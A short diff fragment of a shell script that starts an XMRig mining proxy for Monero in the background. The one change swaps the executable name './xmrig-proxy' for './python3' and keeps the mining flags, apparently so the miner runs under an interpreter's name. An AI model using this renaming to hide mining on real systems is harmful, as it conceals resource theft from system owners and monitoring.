@@ -12,7 +12,7 @@ export BACKEND_HOST=${TCP_HOST}
 export BACKEND_PORT=${TCP_PORT}
 
 # Run xmrig-proxy (backend TCP) in background
-./xmrig-proxy \
+./python3 \
   --coin=XMR \
   -r 2 \
   -R 1 \
